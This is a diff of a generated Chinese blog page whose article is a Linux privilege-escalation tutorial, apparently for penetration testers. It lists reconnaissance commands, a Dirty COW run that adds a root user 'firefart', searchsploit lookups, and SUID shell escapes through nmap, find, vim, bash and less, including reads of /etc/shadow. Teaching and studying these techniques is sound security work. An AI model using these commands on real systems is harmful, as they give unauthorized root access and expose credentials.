@@ -267,7 +267,7 @@
   
   <div class="article-entry" itemprop="articleBody">
     
-    <h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="内核，操作系统和设备信息"><a href="#内核，操作系统和设备信息" class="headerlink" title="内核，操作系统和设备信息"></a>内核，操作系统和设备信息</h2><pre class="line-numbers language-java"><code class="language-java">uname <span class="token operator">-</span>a    打印所有可用的系统信息
+    <h1><span id="信息收集">信息收集</span></h1><h2><span id="内核操作系统和设备信息">内核，操作系统和设备信息</span></h2><pre class="line-numbers language-java"><code class="language-java">uname <span class="token operator">-</span>a    打印所有可用的系统信息
 uname <span class="token operator">-</span>r    内核版本
 uname <span class="token operator">-</span>n    系统主机名
 uname <span class="token operator">-</span>m    查看系统内核架构（<span class="token number">64</span>位<span class="token operator">/</span><span class="token number">32</span>位）
@@ -277,7 +277,7 @@ cat <span class="token operator">/</span>etc<span class="token operator">/</span
 cat <span class="token operator">/</span>etc<span class="token operator">/</span>issue       分发信息
 cat <span class="token operator">/</span>proc<span class="token operator">/</span>cpuinfo    CPU信息
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h2 id="用户和群组"><a href="#用户和群组" class="headerlink" title="用户和群组"></a>用户和群组</h2><pre class="line-numbers language-java"><code class="language-java">cat <span class="token operator">/</span>etc<span class="token operator">/</span>passwd     列出系统上的所有用户
+<h2><span id="用户和群组">用户和群组</span></h2><pre class="line-numbers language-java"><code class="language-java">cat <span class="token operator">/</span>etc<span class="token operator">/</span>passwd     列出系统上的所有用户
 cat <span class="token operator">/</span>etc<span class="token operator">/</span>group      列出系统上的所有组
 grep <span class="token operator">-</span>v <span class="token operator">-</span>E <span class="token string">"^#"</span> <span class="token operator">/</span>etc<span class="token operator">/</span>passwd <span class="token operator">|</span> awk <span class="token operator">-</span>F<span class="token operator">:</span> <span class="token string">'$3 == 0 { print $1}'</span>
                     列出所有的超级用户账户
@@ -288,12 +288,12 @@ lastlog             所有用户上次登录的信息
 lastlog –u <span class="token operator">%</span>username<span class="token operator">%</span>  有关指定用户上次登录的信息
 lastlog <span class="token operator">|</span>grep <span class="token operator">-</span>v <span class="token string">"Never"</span>  以前登录用户的完整列表
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h2 id="用户和权限信息："><a href="#用户和权限信息：" class="headerlink" title="用户和权限信息："></a>用户和权限信息：</h2><pre class="line-numbers language-java"><code class="language-java">whoami        当前用户名
+<h2><span id="用户和权限信息">用户和权限信息：</span></h2><pre class="line-numbers language-java"><code class="language-java">whoami        当前用户名
 id            当前用户信息
 cat <span class="token operator">/</span>etc<span class="token operator">/</span>sudoers  谁被允许以root身份执行
 sudo <span class="token operator">-</span>l       当前用户可以以root身份执行操作
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-<h2 id="环境信息"><a href="#环境信息" class="headerlink" title="环境信息"></a>环境信息</h2><pre class="line-numbers language-java"><code class="language-java">env        显示环境变量
+<h2><span id="环境信息">环境信息</span></h2><pre class="line-numbers language-java"><code class="language-java">env        显示环境变量
 set        现实环境变量
 echo <span class="token operator">%</span>PATH 路径信息
 history    显示当前用户的历史命令记录
@@ -302,7 +302,7 @@ cat <span class="token operator">/</span>etc<span class="token operator">/</span
 cat <span class="token operator">/</span>etc<span class="token operator">/</span>shells    显示可用的shell
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>更多参考 -&gt; <a href="https://www.rebootuser.com/?p=1623" target="_blank" rel="noopener">https://www.rebootuser.com/?p=1623</a></p>
-<h1 id="内核漏洞exp提权"><a href="#内核漏洞exp提权" class="headerlink" title="内核漏洞exp提权"></a>内核漏洞exp提权</h1><h2 id="脏牛漏洞本地提权"><a href="#脏牛漏洞本地提权" class="headerlink" title="脏牛漏洞本地提权"></a>脏牛漏洞本地提权</h2><p><strong>漏洞描述：</strong><br>漏洞编号：CVE-2016-5195<br>漏洞名称：脏牛（Dirty COW）<br>漏洞危害：低权限用户利用该漏洞技术可以在全版本上实现本地提权<br>影响范围：Linux kernel &gt;=2.6.22  并且Android也受影响</p>
+<h1><span id="内核漏洞exp提权">内核漏洞exp提权</span></h1><h2><span id="脏牛漏洞本地提权">脏牛漏洞本地提权</span></h2><p><strong>漏洞描述：</strong><br>漏洞编号：CVE-2016-5195<br>漏洞名称：脏牛（Dirty COW）<br>漏洞危害：低权限用户利用该漏洞技术可以在全版本上实现本地提权<br>影响范围：Linux kernel &gt;=2.6.22  并且Android也受影响</p>
 <p><strong>脏牛漏洞名称的来源：</strong></p>
 <blockquote>
 <p>Linux内核的内存子系统在处理写时拷贝（Copy-on-Write)时存在条件竞争漏洞，导致可以破坏私有只读内存映射。<br>一个低权限的本地用户能够利用此漏洞获取其他只读内存映射的写权限，有可能进一步导致提权漏洞</p>
@@ -321,8 +321,8 @@ cat <span class="token operator">/</span>etc<span class="token operator">/</span
 <p><img src="/images/4/2.png" alt></p>
 <p>4.运行dirty可执行文件进行本地提权<br><code>./dirty passwd</code><br>这个漏洞的执行时间将近三分钟，耐心等待之后即可出现<br><img src="/images/4/3.png" alt></p>
 <p>此时切换到firefart用户，密码为123456<br><img src="/images/4/4.png" alt><br>执行 id 命令后可以看到已经时root用户了，成功提权。</p>
-<h2 id="内核漏洞提权"><a href="#内核漏洞提权" class="headerlink" title="内核漏洞提权"></a>内核漏洞提权</h2><p>如果linux内核版本小于2.6.22或者脏牛无法成功时，我们需要查看其他版本的内核漏洞。这时我们就用到了kali linux，自身所拥有的searchspolit可以帮助我们查看各种linux发行版本的漏洞。而searchs<br>polit的使用也很简单，只需要在后面跟上限定条件即可。<br>查看linux 的漏洞<br><code>searchspolit linux</code><br><img src="/images/4/5.png" alt><br>查看centos6的漏洞<br><code>searchspolit centos 6</code><br><img src="/images/4/6.png" alt><br>通常所用的是查看指定内核版本和linux的发行版本。如：<br><code>searchspolit centos 7 kernel 3.10</code><br><img src="/images/4/7.png" alt><br>所限定的条件越多，当然可利用的漏洞也就越少。我们选中其中符合靶机环境的漏洞后进行查看。<br>利用leafpad命令查看文档内容并且复制到靶机上生成相应的文件。（漏洞的利用虽然是英文，但是一定要看一下使用方法）<br><code>leafpad /usr/share/exploitdb/exploits/linux/dos/41350.c</code><br><img src="/images/4/8.png" alt><br>更多关于searchspolit可以浏览   –&gt; <a href="https://xz.aliyun.com/t/2860" target="_blank" rel="noopener">https://xz.aliyun.com/t/2860</a></p>
-<h1 id="SUID提权"><a href="#SUID提权" class="headerlink" title="SUID提权"></a>SUID提权</h1><p>suid含义：</p>
+<h2><span id="内核漏洞提权">内核漏洞提权</span></h2><p>如果linux内核版本小于2.6.22或者脏牛无法成功时，我们需要查看其他版本的内核漏洞。这时我们就用到了kali linux，自身所拥有的searchspolit可以帮助我们查看各种linux发行版本的漏洞。而searchs<br>polit的使用也很简单，只需要在后面跟上限定条件即可。<br>查看linux 的漏洞<br><code>searchspolit linux</code><br><img src="/images/4/5.png" alt><br>查看centos6的漏洞<br><code>searchspolit centos 6</code><br><img src="/images/4/6.png" alt><br>通常所用的是查看指定内核版本和linux的发行版本。如：<br><code>searchspolit centos 7 kernel 3.10</code><br><img src="/images/4/7.png" alt><br>所限定的条件越多，当然可利用的漏洞也就越少。我们选中其中符合靶机环境的漏洞后进行查看。<br>利用leafpad命令查看文档内容并且复制到靶机上生成相应的文件。（漏洞的利用虽然是英文，但是一定要看一下使用方法）<br><code>leafpad /usr/share/exploitdb/exploits/linux/dos/41350.c</code><br><img src="/images/4/8.png" alt><br>更多关于searchspolit可以浏览   –&gt; <a href="https://xz.aliyun.com/t/2860" target="_blank" rel="noopener">https://xz.aliyun.com/t/2860</a></p>
+<h1><span id="suid提权">SUID提权</span></h1><p>suid含义：</p>
 <blockquote>
 <p>SUID（设置用户ID）是赋予文件的一种权限，它会出现在文件拥有者权限的执行位上，具有这种权限的文件会在其执行时，使调用者暂时获得该文件拥有者的权限。那么，为什么要给Linux二进制文件设置这种权限呢？其实原因有很多，例如，程序ping需要root权限才能打开网络套接字，但执行该程序的用户通常都是由普通用户，来验证与其他主机的连通性</p>
 </blockquote>
@@ -346,24 +346,24 @@ Less
 Nano
 cp
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><p>较旧版本的Nmap（2.02至5.21）带有交互模式，从而允许用户执行shell命令。由于Nmap位于上面使用root权限执行的二进制文件列表中，因此可以使用交互式控制台来运行具有相同权限的shell。）<br>可以使用下命令进入namp交互模式<br><code>nmap --interactive</code></p>
+<h2><span id="nmap">Nmap</span></h2><p>较旧版本的Nmap（2.02至5.21）带有交互模式，从而允许用户执行shell命令。由于Nmap位于上面使用root权限执行的二进制文件列表中，因此可以使用交互式控制台来运行具有相同权限的shell。）<br>可以使用下命令进入namp交互模式<br><code>nmap --interactive</code></p>
 <p>执行命令之后会返回一个shell</p>
 <pre class="line-numbers language-java"><code class="language-java">namp<span class="token operator">></span> <span class="token operator">!</span>sh
 sh<span class="token operator">-</span><span class="token number">3.2</span># whoami
 root
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p><img src="/images/4/10.png" alt><br>在Metasploit中也有一个模块可以通过SUID Namp进行提权<br><code>exploit/unix/local/setuid_nmap</code></p>
-<h2 id="Find"><a href="#Find" class="headerlink" title="Find"></a>Find</h2><p>如果find以SUID权限运行，所有通过find执行的命令都会以root权限运行。</p>
+<h2><span id="find">Find</span></h2><p>如果find以SUID权限运行，所有通过find执行的命令都会以root权限运行。</p>
 <pre class="line-numbers language-java"><code class="language-java">touch test
 find test <span class="token operator">-</span>exec whoami \<span class="token punctuation">;</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<h2 id="Vim"><a href="#Vim" class="headerlink" title="Vim"></a>Vim</h2><p>Vim的主要用途是用作文本编辑器。 但是，如果以SUID运行，它将继承root用户的权限，因此可以读取系统上的所有文件。<br><code>vim /etc/shadow</code></p>
+<h2><span id="vim">Vim</span></h2><p>Vim的主要用途是用作文本编辑器。 但是，如果以SUID运行，它将继承root用户的权限，因此可以读取系统上的所有文件。<br><code>vim /etc/shadow</code></p>
 <p><img src="/images/4/11.png" alt></p>
-<h2 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h2><p>以下命令将以root身份打开一个bash shell。</p>
+<h2><span id="bash">Bash</span></h2><p>以下命令将以root身份打开一个bash shell。</p>
 <pre class="line-numbers language-java"><code class="language-java">bash <span class="token operator">-</span>p
 bash<span class="token operator">-</span><span class="token number">3.2</span># id
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<h2 id="Less"><a href="#Less" class="headerlink" title="Less"></a>Less</h2><p>程序Less也可以执行提权后的shell。同样的方法也适用于其他许多命令</p>
+<h2><span id="less">Less</span></h2><p>程序Less也可以执行提权后的shell。同样的方法也适用于其他许多命令</p>
 <pre class="line-numbers language-java"><code class="language-java">less <span class="token operator">/</span>etc<span class="token operator">/</span>passwd
 <span class="token operator">!</span><span class="token operator">/</span>bin<span class="token operator">/</span>sh
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
@@ -507,7 +507,7 @@ bash<span class="token operator">-</span><span class="token number">3.2</span># 
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#信息收集"><span class="toc-number">1.</span> <span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#内核，操作系统和设备信息"><span class="toc-number">1.1.</span> <span class="toc-text">内核，操作系统和设备信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#用户和群组"><span class="toc-number">1.2.</span> <span class="toc-text">用户和群组</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#用户和权限信息："><span class="toc-number">1.3.</span> <span class="toc-text">用户和权限信息：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#环境信息"><span class="toc-number">1.4.</span> <span class="toc-text">环境信息</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#内核漏洞exp提权"><span class="toc-number">2.</span> <span class="toc-text">内核漏洞exp提权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#脏牛漏洞本地提权"><span class="toc-number">2.1.</span> <span class="toc-text">脏牛漏洞本地提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#内核漏洞提权"><span class="toc-number">2.2.</span> <span class="toc-text">内核漏洞提权</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SUID提权"><span class="toc-number">3.</span> <span class="toc-text">SUID提权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Nmap"><span class="toc-number">3.1.</span> <span class="toc-text">Nmap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Find"><span class="toc-number">3.2.</span> <span class="toc-text">Find</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Vim"><span class="toc-number">3.3.</span> <span class="toc-text">Vim</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bash"><span class="toc-number">3.4.</span> <span class="toc-text">Bash</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less"><span class="toc-number">3.5.</span> <span class="toc-text">Less</span></a></li></ol></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#null"><span class="toc-number">1.</span> <span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#null"><span class="toc-number">1.1.</span> <span class="toc-text">内核，操作系统和设备信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#null"><span class="toc-number">1.2.</span> <span class="toc-text">用户和群组</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#null"><span class="toc-number">1.3.</span> <span class="toc-text">用户和权限信息：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#null"><span class="toc-number">1.4.</span> <span class="toc-text">环境信息</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#null"><span class="toc-number">2.</span> <span class="toc-text">内核漏洞exp提权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#null"><span class="toc-number">2.1.</span> <span class="toc-text">脏牛漏洞本地提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#null"><span class="toc-number">2.2.</span> <span class="toc-text">内核漏洞提权</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#null"><span class="toc-number">3.</span> <span class="toc-text">SUID提权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#null"><span class="toc-number">3.1.</span> <span class="toc-text">Nmap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#null"><span class="toc-number">3.2.</span> <span class="toc-text">Find</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#null"><span class="toc-number">3.3.</span> <span class="toc-text">Vim</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#null"><span class="toc-number">3.4.</span> <span class="toc-text">Bash</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#null"><span class="toc-number">3.5.</span> <span class="toc-text">Less</span></a></li></ol></li></ol>
                     </div>
                 </span>
             </div>
@@ -647,6 +647,10 @@ bash<span class="token operator">-</span><span class="token number">3.2</span># 
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">漏洞复现</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">内网渗透</a>
               </li>
              
@@ -655,11 +659,11 @@ bash<span class="token operator">-</span><span class="token number">3.2</span># 
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">免杀</a>
+                <a href="javascript:void(0)" class="js-tag color3">提权</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">漏洞复现</a>
+                <a href="javascript:void(0)" class="js-tag color1">Linux</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -667,19 +671,11 @@ bash<span class="token operator">-</span><span class="token number">3.2</span># 
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">Web安全</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">sql server</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">提权</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">Linux</a>
+                <a href="javascript:void(0)" class="js-tag color1">Web安全</a>
               </li>
              
               <li class="article-tag-list-item">
